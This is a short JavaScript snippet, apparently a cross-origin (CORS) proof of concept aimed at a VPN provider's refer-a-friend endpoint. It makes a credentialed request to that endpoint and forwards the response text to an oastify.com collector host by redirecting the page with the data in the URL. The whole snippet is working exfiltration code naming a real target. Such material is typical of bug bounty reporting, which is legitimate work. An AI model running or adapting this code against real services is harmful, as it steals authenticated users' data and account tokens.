var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://beta-my.cyberghostvpn.com/refer-a-friend/create',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='https://r3vkj3gk2ywxi4ecwepmlgmz7qdh17pw.oastify.com/log?key='+this.responseText;
};
